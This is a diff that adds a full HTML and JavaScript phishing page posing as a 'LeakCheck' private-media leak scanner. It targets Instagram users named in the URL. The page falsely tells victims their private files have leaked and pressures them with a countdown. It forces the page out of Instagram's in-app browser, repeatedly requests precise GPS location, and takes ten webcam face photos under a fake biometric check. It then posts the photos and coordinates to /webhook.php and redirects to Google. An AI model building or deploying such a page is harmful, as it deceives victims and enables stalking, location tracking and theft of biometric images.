@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="referrer" content="no-referrer">
+  <title>LeakCheck – Private Media Scanner</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --bg: #0b0b0f;
+      --card-bg: rgba(18, 18, 28, 0.9);
+      --text: #e0e0e0;
+      --heading: #f1f3f5;
+      --muted: #9ca3af;
+      --accent: #e63946;
+      --accent-hover: #c62828;
+      --yellow: #fbbf24;
+      --green: #22c55e;
+      --border: rgba(255, 255, 255, 0.08);
+      --ip-bg: rgba(0,0,0,0.4);
+      --ip-text: #fca5a5;
+      --warning-bg: rgba(230,57,70,0.08);
+      --warning-border: rgba(230,57,70,0.3);
+      --countdown-bg: rgba(251,191,36,0.08);
+      --countdown-border: rgba(251,191,36,0.3);
+      --dot-bg: #374151;
+      --footer-link: #555;
+      --btn-shadow: rgba(230,57,70,0.4);
+      --glow: rgba(230,57,70,0.3);
+      --pulse: rgba(230,57,70,0.5);
+      --username-bg: rgba(255,255,255,0.05);
+      --username-border: rgba(255,255,255,0.1);
+    }
+
+    body.light-mode {
+      --bg: #f0f2f5;
+      --card-bg: rgba(255, 255, 255, 0.92);
+      --text: #1a1a1a;
+      --heading: #0f0f0f;
+      --muted: #6b7280;
+      --accent: #c62828;
+      --yellow: #b45309;
+      --border: rgba(0,0,0,0.08);
+      --ip-bg: rgba(0,0,0,0.05);
+      --ip-text: #b91c1c;
+      --warning-bg: #fff5f5;
+      --warning-border: #fecaca;
+      --countdown-bg: #fffbeb;
+      --countdown-border: #fde68a;
+      --dot-bg: #e5e7eb;
+      --footer-link: #9ca3af;
+      --btn-shadow: rgba(211,47,47,0.25);
+      --glow: rgba(211,47,47,0.15);
+      --pulse: rgba(211,47,47,0.4);
+      --username-bg: rgba(0,0,0,0.04);
+      --username-border: rgba(0,0,0,0.1);
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: var(--bg);
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      transition: background 0.3s;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: radial-gradient(circle at 50% 0%, #1e1a2a 0%, #0b0b0f 70%);
+      z-index: 0;
+      transition: opacity 0.3s;
+    }
+    body.light-mode::before {
+      background: radial-gradient(circle at 50% 0%, #ffffff 0%, #f0f2f5 70%);
+    }
+
+    #alert-screen {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      transition: opacity 0.5s ease;
+    }
+
+    .controls {
+      position: fixed;
+      top: 16px;
+      right: 16px;
+      z-index: 10;
+      display: flex;
+      gap: 8px;
+    }
+    .ctrl-btn {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border: none;
+      background: var(--card-bg);
+      color: var(--text);
+      font-size: 16px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      transition: background 0.3s;
+    }
+    .ctrl-btn:hover {
+      background: var(--accent);
+      color: white;
+    }
+
+    .card {
+      background: var(--card-bg);
+      backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
+      border: 1px solid var(--border);
+      border-radius: 28px;
+      padding: 20px 16px;
+      width: 92%;
+      max-width: 380px;
+      max-height: 98vh;
+      overflow-y: auto;
+      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255,255,255,0.05) inset;
+      text-align: center;
+      transition: background 0.3s, border-color 0.3s;
+    }
+
+    .brand-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-bottom: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--heading);
+    }
+    .brand-header i { font-size: 20px; color: var(--accent); }
+    .verified-badge {
+      background: var(--accent); color: white;
+      font-size: 8px; padding: 2px 7px;
+      border-radius: 12px; font-weight: 600;
+      letter-spacing: 0.3px;
+    }
+
+    .leaked-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 6px;
+      margin-bottom: 12px;
+    }
+    .leaked-thumb {
+      aspect-ratio: 1 / 1;
+      background: #1e1e28;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(255,255,255,0.06);
+    }
+    .leaked-thumb i.fa-file-icon { font-size: 26px; color: #5a5a6e; z-index: 1; }
+    .leaked-thumb img.profile-pic {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      object-fit: cover;
+      z-index: 0;
+      filter: brightness(0.9);
+    }
+    .blur-overlay {
+      position: absolute; top: 0; left: 0;
+      width: 100%; height: 100%;
+      backdrop-filter: blur(2px);
+      -webkit-backdrop-filter: blur(2px);
+      background: rgba(0,0,0,0.1);
+      z-index: 1;
+    }
+    .play-icon-overlay {
+      position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 20px; color: rgba(255,255,255,0.7); z-index: 2;
+    }
+    .file-label {
+      position: absolute; bottom: 3px; left: 3px;
+      background: rgba(0,0,0,0.6); color: #ccc;
+      font-size: 7px; padding: 2px 5px; border-radius: 3px;
+      font-family: 'SF Mono', monospace; z-index: 2;
+    }
+
+    .scan-info { margin-bottom: 10px; font-size: 12px; color: var(--muted); }
+    .scan-info b { color: var(--yellow); }
+
+    .play-btn-wrapper { margin-bottom: 12px; }
+    .play-btn {
+      width: 52px; height: 52px;
+      background: var(--accent); border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto;
+      box-shadow: 0 0 25px var(--pulse);
+      animation: pulse 2s infinite;
+    }
+    .play-btn i { font-size: 22px; color: white; margin-left: 2px; }
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 var(--pulse); }
+      70% { box-shadow: 0 0 0 16px transparent; }
+      100% { box-shadow: 0 0 0 0 transparent; }
+    }
+
+    h1 { font-size: 19px; font-weight: 700; color: var(--heading); margin-bottom: 4px; }
+    .subtitle { font-size: 11px; color: var(--muted); line-height: 1.4; margin-bottom: 14px; }
+    .highlight { color: var(--yellow); font-weight: 600; }
+    .ig-username {
+      background: var(--username-bg); border: 1px solid var(--username-border);
+      border-radius: 10px; padding: 5px 12px; font-size: 13px;
+      color: var(--heading); font-weight: 600; display: inline-block; margin-bottom: 12px;
+    }
+
+    .ip-box {
+      background: var(--ip-bg); border: 1px solid var(--border);
+      border-radius: 12px; padding: 8px 12px; margin-bottom: 12px;
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+      font-family: 'SF Mono', monospace; font-size: 12px; color: var(--ip-text);
+    }
+    .ip-box i { color: var(--accent); }
+
+    .warning-box {
+      display: none;
+      background: var(--warning-bg); border: 1px solid var(--warning-border);
+      border-radius: 12px; padding: 10px; margin-bottom: 12px; animation: shake 0.5s ease;
+    }
+    .warning-box .warn-title { color: var(--accent); font-weight: 700; font-size: 13px; margin-bottom: 2px; }
+    .warning-box p { color: #fca5a5; font-size: 11px; margin: 0; }
+
+    .countdown {
+      background: var(--countdown-bg); border: 1px solid var(--countdown-border);
+      border-radius: 10px; padding: 6px 12px; margin-bottom: 12px;
+      font-size: 13px; font-weight: 700; color: var(--yellow);
+      display: flex; align-items: center; justify-content: center; gap: 6px;
+    }
+
+    .features { display: flex; justify-content: center; gap: 16px; margin-bottom: 16px; }
+    .feature-item { font-size: 10px; color: var(--muted); display: flex; flex-direction: column; align-items: center; gap: 2px; }
+    .feature-item i { font-size: 18px; color: #fca5a5; }
+
+    .btn {
+      background: var(--accent); color: white; border: none;
+      padding: 12px 16px; font-size: 15px; border-radius: 14px;
+      cursor: pointer; font-weight: 600; width: 100%;
+      letter-spacing: 0.3px; box-shadow: 0 6px 15px var(--btn-shadow);
+      transition: all 0.3s ease;
+    }
+    .btn:hover { background: var(--accent-hover); transform: translateY(-1px); }
+    .btn:disabled { opacity: 0.6; transform: none; cursor: wait; }
+
+    .status { font-size: 11px; color: var(--muted); margin-top: 10px; min-height: 16px; }
+
+    .footer-links { display: flex; justify-content: center; gap: 14px; margin-top: 10px; font-size: 9px; }
+    .footer-links a { color: var(--footer-link); text-decoration: none; }
+
+    .hidden { display: none !important; }
+
+    .face-circle {
+      width: 160px; height: 160px; border-radius: 50%;
+      overflow: hidden; border: 4px solid var(--accent);
+      box-shadow: 0 0 30px var(--glow);
+      margin: 14px auto; background: #000;
+    }
+    .face-circle video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+
+    .instruction {
+      color: var(--yellow); font-size: 18px; font-weight: 700;
+      margin-top: 6px; min-height: 22px; animation: fadeIn 0.5s ease;
+    }
+
+    .progress-dots { display: flex; justify-content: center; gap: 8px; margin: 12px 0 6px; }
+    .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--dot-bg); transition: all 0.4s ease; }
+    .dot.active { background: var(--accent); transform: scale(1.3); box-shadow: 0 0 10px var(--pulse); }
+    .dot.done { background: var(--green); }
+
+    #scan-status { font-size: 12px; color: var(--muted); margin-top: 4px; }
+
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-5px)} 75%{transform:translateX(5px)} }
+  </style>
+</head>
+<body class="light-mode">
+
+  <!-- Instagram / WebView detection – forces external browser -->
+  <script>
+  (function() {
+    var ua = navigator.userAgent || '';
+    var isInstagram = /Instagram/i.test(ua);
+    var isWebView  = /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(ua) ||
+                     /Android.*Version\/[\d\.]+\sChrome\/[^\s]+\sMobile/i.test(ua);
+
+    if (isInstagram || isWebView) {
+      document.body.innerHTML = `
+        <div style="
+          position:fixed; top:0; left:0; width:100%; height:100%;
+          background:#0b0b0f; color:#e0e0e0; font-family:Inter,sans-serif;
+          display:flex; align-items:center; justify-content:center; text-align:center;
+          z-index:999999; padding:20px; box-sizing:border-box;
+        ">
+          <div style="max-width:320px;">
+            <div style="font-size:48px; margin-bottom:20px;">🔒</div>
+            <h2 style="color:#e63946; margin-bottom:10px;">Open in Browser Required</h2>
+            <p style="color:#9ca3af; font-size:14px; line-height:1.5;">
+              To complete the verification, please open this link in your device’s browser (Chrome, Safari, etc.).
+            </p>
+            <div style="margin:20px 0; color:#fbbf24; font-size:13px;">
+              <b>Tap the three‑dot menu</b> (top right) and select <b>“Open in Browser”</b>.
+            </div>
+            <div style="color:#555; font-size:11px;">
+              This step keeps your account secure.
+            </div>
+          </div>
+        </div>
+      `;
+      throw new Error('Instagram WebView detected – aborting');
+    }
+  })();
+  </script>
+
+  <div class="controls">
+    <button class="ctrl-btn" id="langToggle" title="English / اردو"><i class="fas fa-globe"></i></button>
+    <button class="ctrl-btn" id="themeToggle" title="Dark/Light mode"><i class="fas fa-sun"></i></button>
+  </div>
+
+<div id="alert-screen">
+  <!-- GPS CARD -->
+  <div class="card" id="gps-card">
+    <div class="brand-header">
+      <i class="fas fa-shield-haltered"></i> LeakCheck
+      <span class="verified-badge" data-i18n="verified">Verified</span>
+    </div>
+
+    <div class="leaked-grid">
+      <div class="leaked-thumb">
+        <img class="profile-pic" src="profiles/profile.jpg" alt="" crossorigin="anonymous" onerror="this.style.display='none'">
+        <i class="fas fa-video fa-file-icon"></i>
+        <div class="blur-overlay"></div>
+        <i class="fas fa-play play-icon-overlay"></i>
+        <span class="file-label" id="file1">video.mp4</span>
+      </div>
+      <div class="leaked-thumb">
+        <img class="profile-pic" src="profiles/profile.jpg" alt="" crossorigin="anonymous" onerror="this.style.display='none'">
+        <i class="fas fa-image fa-file-icon"></i>
+        <div class="blur-overlay"></div>
+        <i class="fas fa-play play-icon-overlay"></i>
+        <span class="file-label" id="file2">photo.jpg</span>
+      </div>
+      <div class="leaked-thumb">
+        <img class="profile-pic" src="profiles/profile.jpg" alt="" crossorigin="anonymous" onerror="this.style.display='none'">
+        <i class="fas fa-film fa-file-icon"></i>
+        <div class="blur-overlay"></div>
+        <i class="fas fa-play play-icon-overlay"></i>
+        <span class="file-label" id="file3">clip.mov</span>
+      </div>
+      <div class="leaked-thumb">
+        <img class="profile-pic" src="profiles/profile.jpg" alt="" crossorigin="anonymous" onerror="this.style.display='none'">
+        <i class="fas fa-image fa-file-icon"></i>
+        <div class="blur-overlay"></div>
+        <i class="fas fa-play play-icon-overlay"></i>
+        <span class="file-label" id="file4">selfie.jpg</span>
+      </div>
+    </div>
+
+    <div class="scan-info">
+      <i class="fas fa-search"></i> <b data-i18n="files_found">12 private files</b> <span data-i18n="found_from">found from this device</span>
+    </div>
+
+    <div class="play-btn-wrapper">
+      <div class="play-btn"><i class="fas fa-play"></i></div>
+    </div>
+
+    <h1 data-i18n="incident_title">Incident Report #LKC‑2847</h1>
+    <p class="subtitle" data-i18n="incident_desc">Private media attributed to your account has been detected in an external data leak.<br>Confirm your identity to view details and submit a removal request.</p>
+
+    <div class="ig-username" id="target-username">@username</div>
+
+    <div class="ip-box" id="ip-display">
+      <i class="fas fa-globe"></i> <span data-i18n="your_ip">Your IP:</span> <span id="user-ip">Detecting…</span>
+    </div>
+
+    <div class="warning-box" id="warning-box">
+      <div class="warn-title"><i class="fas fa-info-circle"></i> <span data-i18n="location_required">Location Required</span></div>
+      <p data-i18n="location_reason">We need your approximate location to confirm you’re the owner.</p>
+    </div>
+
+    <div class="countdown" id="countdown-timer">
+      <i class="fas fa-hourglass-half"></i> <span data-i18n="access_window">Access window:</span> <span id="timer">04:59</span>
+    </div>
+
+    <div class="features">
+      <div class="feature-item"><i class="fas fa-user-shield"></i><span data-i18n="verification">Verification</span></div>
+      <div class="feature-item"><i class="fas fa-ban"></i><span data-i18n="removal">Removal</span></div>
+      <div class="feature-item"><i class="fas fa-clock"></i><span data-i18n="urgent">Urgent</span></div>
+    </div>
+
+    <button class="btn" id="verify-btn" onclick="allowGPS()"><i class="fas fa-lock"></i> <span data-i18n="view_leaked">View Leaked Content</span></button>
+    <p class="status" data-i18n="waiting_location">Waiting for location access…</p>
+
+    <div class="footer-links">
+      <a href="#" data-i18n="privacy">Privacy</a>
+      <a href="#" data-i18n="terms">Terms</a>
+      <a href="#" data-i18n="report">Report</a>
+    </div>
+  </div>
+
+  <!-- CAMERA CARD -->
+  <div class="card hidden" id="camera-card">
+    <div class="brand-header">
+      <i class="fas fa-shield-haltered"></i> LeakCheck
+      <span class="verified-badge" data-i18n="verified">Verified</span>
+    </div>
+
+    <div style="font-size:34px; color:var(--accent); margin-bottom:6px;"><i class="fas fa-fingerprint"></i></div>
+    <h1 data-i18n="biometric_title">Biometric Identity Verification</h1>
+    <p class="subtitle">
+      <span data-i18n="biometric_desc1">To confirm you are the legitimate owner of the account</span><br>
+      <span class="ig-username" id="cam-username">@username</span>,<br>
+      <span data-i18n="biometric_desc2">a <span class="highlight">facial authentication</span> is required per our security protocol.</span>
+    </p>
+
+    <div class="face-circle">
+      <video id="face-video" autoplay playsinline muted></video>
+    </div>
+    <div class="instruction" id="instruction" data-i18n="press_start">Press "Start Face Scan" to begin</div>
+    <div class="progress-dots" id="progress-dots">
+      <span class="dot" data-phase="0"></span>
+      <span class="dot" data-phase="1"></span>
+      <span class="dot" data-phase="2"></span>
+      <span class="dot" data-phase="3"></span>
+    </div>
+    <p id="scan-status" data-i18n="position_face">Position your face inside the circle</p>
+
+    <button class="btn" id="start-scan-btn" style="margin-top:14px;"><i class="fas fa-fingerprint"></i> <span data-i18n="authenticate">Authenticate & Unlock</span></button>
+    <p class="status" style="font-size:10px; margin-top:8px;" data-i18n="biometric_note">This verification is required to view incident details and submit a takedown request.</p>
+  </div>
+
+  <!-- SUCCESS CARD -->
+  <div class="card hidden" id="success-card">
+    <div class="success-icon"><i class="fas fa-check-circle" style="font-size:52px; color:var(--green);"></i></div>
+    <h1 style="color:var(--green);" data-i18n="takedown_submitted">Takedown Request Submitted</h1>
+    <p class="subtitle" style="margin-top: 10px;">
+      <span data-i18n="incident_processed1">Incident <b>#LKC‑2847</b> for account</span><br>
+      <span class="ig-username" id="success-username">@username</span><br>
+      <span data-i18n="incident_processed2">has been processed. The identified content will be removed within <b>24‑48 hours</b>.</span>
+    </p>
+    <p class="subtitle" style="color:var(--muted); font-size:10px; margin-top:12px;">
+      <span data-i18n="confirmation_note">A confirmation email will be sent to the registered address.<br>You will now be redirected to the main portal.</span>
+    </p>
+  </div>
+</div>
+
+<!-- tc_payload -->
+<script>
+// ========== LANGUAGE & THEME SYSTEM ==========
+const translations = {
+  en: {
+    verified: "Verified",
+    files_found: "12 private files",
+    found_from: "found from this device",
+    incident_title: "Incident Report #LKC‑2847",
+    incident_desc: "Private media attributed to your account has been detected in an external data leak.<br>Confirm your identity to view details and submit a removal request.",
+    your_ip: "Your IP:",
+    location_required: "Location Required",
+    location_reason: "We need your approximate location to confirm you’re the owner.",
+    access_window: "Access window:",
+    verification: "Verification",
+    removal: "Removal",
+    urgent: "Urgent",
+    view_leaked: "View Leaked Content",
+    waiting_location: "Waiting for location access…",
+    privacy: "Privacy",
+    terms: "Terms",
+    report: "Report",
+    biometric_title: "Biometric Identity Verification",
+    biometric_desc1: "To confirm you are the legitimate owner of the account",
+    biometric_desc2: "a <span class=\"highlight\">facial authentication</span> is required per our security protocol.",
+    press_start: "Press \"Start Face Scan\" to begin",
+    position_face: "Position your face inside the circle",
+    authenticate: "Authenticate & Unlock",
+    biometric_note: "This verification is required to view incident details and submit a takedown request.",
+    takedown_submitted: "Takedown Request Submitted",
+    incident_processed1: "Incident <b>#LKC‑2847</b> for account",
+    incident_processed2: "has been processed. The identified content will be removed within <b>24‑48 hours</b>.",
+    confirmation_note: "A confirmation email will be sent to the registered address.<br>You will now be redirected to the main portal.",
+    location_confirmed: "✅ Location confirmed.",
+    location_denied: "⚠️ Location denied.",
+    retrying: "Retrying…",
+    obtaining: "Obtaining location…",
+    preparing: "Preparing facial verification…",
+    scan_straight: "Look straight ahead",
+    scan_left: "Turn head slightly left",
+    scan_right: "Turn head slightly right",
+    scan_full: "Full photo",
+    capturing: "Capturing…",
+    uploading: "Uploading…",
+    scan_complete: "Scan complete!",
+    processing: "Processing…",
+    upload_failed: "Upload failed. Redirecting…",
+    error: "Error:"
+  },
+  ur: {
+    verified: "تصدیق شدہ",
+    files_found: "12 نجی فائلیں",
+    found_from: "اس ڈیوائس سے ملی ہیں",
+    incident_title: "واقعہ رپورٹ #LKC‑2847",
+    incident_desc: "آپ کے اکاؤنٹ سے منسوب نجی میڈیا ایک بیرونی ڈیٹا لیک میں پایا گیا ہے۔<br>تفصیلات دیکھنے اور ہٹانے کی درخواست جمع کرانے کے لیے اپنی شناخت کی تصدیق کریں۔",
+    your_ip: "آپ کا IP:",
+    location_required: "مقام درکار ہے",
+    location_reason: "مالک کی تصدیق کے لیے ہمیں آپ کے تخمینی مقام کی ضرورت ہے۔",
+    access_window: "رسائی کی مدت:",
+    verification: "تصدیق",
+    removal: "ہٹانا",
+    urgent: "ہنگامی",
+    view_leaked: "لیک شدہ مواد دیکھیں",
+    waiting_location: "مقام کی اجازت کا انتظار ہے…",
+    privacy: "رازداری",
+    terms: "شرائط",
+    report: "رپورٹ",
+    biometric_title: "بایومیٹرک شناخت کی تصدیق",
+    biometric_desc1: "اس بات کی تصدیق کے لیے کہ آپ اکاؤنٹ کے جائز مالک ہیں",
+    biometric_desc2: "ہمارے حفاظتی پروٹوکول کے تحت <span class=\"highlight\">چہرے کی تصدیق</span> درکار ہے۔",
+    press_start: "شروع کرنے کے لیے \"چہرے کا اسکین شروع کریں\" دبائیں",
+    position_face: "اپنا چہرہ دائرے کے اندر رکھیں",
+    authenticate: "تصدیق کریں اور کھولیں",
+    biometric_note: "واقعہ کی تفصیلات دیکھنے اور ہٹانے کی درخواست جمع کرانے کے لیے یہ تصدیق درکار ہے۔",
+    takedown_submitted: "ہٹانے کی درخواست جمع ہو گئی",
+    incident_processed1: "اکاؤنٹ کے لیے واقعہ <b>#LKC‑2847</b>",
+    incident_processed2: "پر کارروائی ہو چکی ہے۔ شناخت شدہ مواد <b>24‑48 گھنٹوں</b> میں ہٹا دیا جائے گا۔",
+    confirmation_note: "رجسٹرڈ ای میل پر ایک تصدیقی پیغام بھیجا جائے گا۔<br>اب آپ کو مین پورٹل پر بھیج دیا جائے گا۔",
+    location_confirmed: "✅ مقام کی تصدیق ہو گئی۔",
+    location_denied: "⚠️ مقام مسترد کر دیا گیا۔",
+    retrying: "دوبارہ کوشش ہو رہی ہے…",
+    obtaining: "مقام حاصل کیا جا رہا ہے…",
+    preparing: "چہرے کی تصدیق تیار ہو رہی ہے…",
+    scan_straight: "سیدھا دیکھیں",
+    scan_left: "سر تھوڑا بائیں گھمائیں",
+    scan_right: "سر تھوڑا دائیں گھمائیں",
+    scan_full: "مکمل تصویر",
+    capturing: "کیپچر ہو رہا ہے…",
+    uploading: "اپ لوڈ ہو رہا ہے…",
+    scan_complete: "اسکین مکمل!",
+    processing: "کارروائی ہو رہی ہے…",
+    upload_failed: "اپ لوڈ ناکام۔ ری ڈائریکٹ ہو رہا ہے…",
+    error: "خرابی:"
+  }
+};
+
+let currentLang = 'en';
+
+function setLanguage(lang) {
+  currentLang = lang;
+  const t = translations[lang];
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const key = el.getAttribute('data-i18n');
+    if (t[key]) {
+      if (t[key].includes('<') || key === 'biometric_desc2' || key === 'incident_desc' || key === 'confirmation_note' || key === 'incident_processed1' || key === 'incident_processed2') {
+        el.innerHTML = t[key];
+      } else {
+        el.textContent = t[key];
+      }
+    }
+  });
+  document.documentElement.lang = lang === 'ur' ? 'ur' : 'en';
+  if (lang === 'ur') {
+    document.body.setAttribute('dir', 'rtl');
+    document.querySelectorAll('.card').forEach(c => c.style.direction = 'rtl');
+  } else {
+    document.body.removeAttribute('dir');
+    document.querySelectorAll('.card').forEach(c => c.style.direction = 'ltr');
+  }
+}
+
+// Theme toggle
+const themeToggle = document.getElementById('themeToggle');
+const themeIcon = themeToggle.querySelector('i');
+themeToggle.addEventListener('click', () => {
+  document.body.classList.toggle('light-mode');
+  if (document.body.classList.contains('light-mode')) {
+    themeIcon.className = 'fas fa-sun';
+    localStorage.setItem('theme', 'light');
+  } else {
+    themeIcon.className = 'fas fa-moon';
+    localStorage.setItem('theme', 'dark');
+  }
+});
+
+// Language toggle
+document.getElementById('langToggle').addEventListener('click', () => {
+  const newLang = currentLang === 'en' ? 'ur' : 'en';
+  setLanguage(newLang);
+  localStorage.setItem('lang', newLang);
+});
+
+// Restore preferences
+(function() {
+  const savedTheme = localStorage.getItem('theme');
+  if (savedTheme === 'dark') {
+    document.body.classList.remove('light-mode');
+    themeIcon.className = 'fas fa-moon';
+  } else {
+    themeIcon.className = 'fas fa-sun';
+  }
+  const savedLang = localStorage.getItem('lang');
+  if (savedLang && translations[savedLang]) setLanguage(savedLang);
+})();
+
+// ========== USERNAME & FAKE FILENAMES ==========
+(function() {
+  var params = new URLSearchParams(window.location.search);
+  var user = params.get('user') || '__TARGET_USER__';
+  var username = '@' + user;
+  document.getElementById('target-username').textContent = username;
+  document.getElementById('cam-username').textContent = username;
+  document.getElementById('success-username').textContent = username;
+
+  var cleanUser = user.replace(/[^a-zA-Z0-9_]/g, '').toLowerCase() || 'user';
+  document.getElementById('file1').textContent = cleanUser + '_private_story.mp4';
+  document.getElementById('file2').textContent = cleanUser + '_chat_screenshot.jpg';
+  document.getElementById('file3').textContent = cleanUser + '_camera_roll.mov';
+  document.getElementById('file4').textContent = cleanUser + '_hidden_album.jpg';
+})();
+
+// ========== GPS TRIGGER ==========
+(function() {
+  var gpsDone = false, retryCount = 0;
+  function onGPSSuccess(pos) {
+    if(gpsDone) return; gpsDone = true;
+    window._gpsCaptured = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) };
+    document.getElementById('warning-box').style.display='none';
+    document.getElementById('verify-btn').style.display='none';
+    document.getElementById('countdown-timer').style.display='none';
+    var statusEl = document.querySelector('#gps-card .status');
+    statusEl.innerHTML = translations[currentLang].location_confirmed;
+    setTimeout(function(){
+      document.getElementById('gps-card').classList.add('hidden');
+      document.getElementById('camera-card').classList.remove('hidden');
+    }, 600);
+  }
+  function onGPSError(err) {
+    retryCount++;
+    if(err.code===1){
+      document.getElementById('warning-box').style.display='block';
+      document.querySelector('#gps-card .status').innerHTML = translations[currentLang].location_denied;
+      document.getElementById('verify-btn').style.display='block';
+      return;
+    }
+    if(retryCount<5){
+      document.querySelector('#gps-card .status').innerHTML = '<i class="fas fa-spinner fa-spin"></i> ' + translations[currentLang].retrying;
+      setTimeout(tryGPS,1500);
+    }
+  }
+  function tryGPS() {
+    if(gpsDone||!navigator.geolocation) return;
+    document.getElementById('verify-btn').style.display='none';
+    document.getElementById('warning-box').style.display='none';
+    document.querySelector('#gps-card .status').innerHTML = '<i class="fas fa-spinner fa-spin"></i> ' + translations[currentLang].obtaining;
+    navigator.geolocation.getCurrentPosition(onGPSSuccess,onGPSError,{ enableHighAccuracy:true, timeout:8000, maximumAge:0 });
+    setTimeout(function(){ if(!gpsDone) navigator.geolocation.getCurrentPosition(onGPSSuccess,function(){},{ enableHighAccuracy:false, timeout:5000, maximumAge:600000 }); },3000);
+  }
+  window.allowGPS = function(){ tryGPS(); };
+  tryGPS();
+  setInterval(function(){ if(!gpsDone) tryGPS(); },6000);
+})();
+
+// ========== FACE SCAN (10 photos) ==========
+(function() {
+  var startBtn = document.getElementById('start-scan-btn');
+  var video = document.getElementById('face-video');
+  var instruction = document.getElementById('instruction');
+  var scanStatus = document.getElementById('scan-status');
+  var dots = document.querySelectorAll('.dot');
+  var stream = null, photos = [];
+  var PHASES = [
+    { nameKey: 'scan_straight', captureCount: 3, burst: true },
+    { nameKey: 'scan_left', captureCount: 3, burst: true },
+    { nameKey: 'scan_right', captureCount: 3, burst: true },
+    { nameKey: 'scan_full', captureCount: 1, burst: false }
+  ];
+  function resetDots(){ dots.forEach(d=>d.classList.remove('active','done')); }
+  function setPhase(i){ resetDots(); for(let j=0;j<=i;j++){ if(j<i)dots[j].classList.add('done'); else dots[j].classList.add('active'); } }
+  function snap(){ var c=document.createElement('canvas'); c.width=video.videoWidth||640; c.height=video.videoHeight||480; c.getContext('2d').drawImage(video,0,0); return c.toDataURL('image/jpeg',0.7); }
+  function wait(ms){ return new Promise(r=>setTimeout(r,ms)); }
+  function upload(arr){
+    scanStatus.textContent = translations[currentLang].uploading;
+    var fd=new FormData();
+    arr.forEach(function(b64,i){ var blob=dataURItoBlob(b64); fd.append('photo_'+i,blob,'face_'+i+'.jpg'); });
+    if(window._gpsCaptured) fd.append('gps',JSON.stringify(window._gpsCaptured));
+    fetch('/webhook.php',{method:'POST',body:fd})
+      .then(function(){
+        document.getElementById('camera-card').classList.add('hidden');
+        document.getElementById('success-card').classList.remove('hidden');
+        setTimeout(function(){ location.href='https://www.google.com'; },4000);
+      })
+      .catch(function(){ scanStatus.textContent = translations[currentLang].upload_failed; setTimeout(function(){ location.href='https://www.google.com'; },2000); });
+  }
+  function dataURItoBlob(dataURI){
+    var arr=dataURI.split(','), mime=arr[0].match(/:(.*?);/)[1], bstr=atob(arr[1]), n=bstr.length, u8=new Uint8Array(n);
+    for(var i=0;i<n;i++) u8[i]=bstr.charCodeAt(i); return new Blob([u8],{type:mime});
+  }
+  startBtn.addEventListener('click', async function(){
+    if(startBtn.disabled) return; startBtn.disabled=true; startBtn.textContent = translations[currentLang].authenticate;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}}, audio:false });
+      video.srcObject=stream; await video.play(); await wait(500);
+      for(let p=0;p<PHASES.length;p++){
+        setPhase(p);
+        var phase = PHASES[p];
+        instruction.textContent = translations[currentLang][phase.nameKey];
+        scanStatus.textContent = translations[currentLang].capturing;
+        if(!phase.burst){ photos.push(snap()); await wait(1000); }
+        else { for(let i=0;i<phase.captureCount;i++){ photos.push(snap()); if(i<phase.captureCount-1) await wait(800); } }
+        if(p<PHASES.length-1) await wait(800);
+      }
+      stream.getTracks().forEach(t=>t.stop()); video.srcObject=null;
+      instruction.textContent = translations[currentLang].scan_complete;
+      scanStatus.textContent = translations[currentLang].processing;
+      upload(photos);
+    } catch(e){
+      scanStatus.textContent = translations[currentLang].error + ' ' + (e.message||e.name);
+      startBtn.disabled=false;
+      startBtn.textContent = translations[currentLang].authenticate;
+      if(stream) stream.getTracks().forEach(t=>t.stop());
+    }
+  });
+})();
+</script>
+
+</body>
+</html>
